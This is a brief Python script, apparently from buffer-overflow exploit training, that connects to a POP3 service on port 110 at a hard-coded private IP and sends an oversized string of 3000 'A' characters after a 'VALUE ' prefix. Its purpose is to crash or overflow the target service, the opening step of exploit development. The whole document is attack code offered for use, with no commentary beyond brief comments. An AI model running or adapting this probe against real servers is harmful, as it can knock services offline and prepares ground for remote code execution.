#!/usr/bin/python
import socket
import struct

#set up the IP and port to connect to
RHOST = "192.168.1.238" 
RPORT = 110

#set up the IP and port to connect to
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((RHOST,RPORT))

#build a message

buf = ""
buf += "A"*3000
buf += "\r\n"

#send the message
s.send("VALUE " + buf)

s.recv(1024)

s.close()
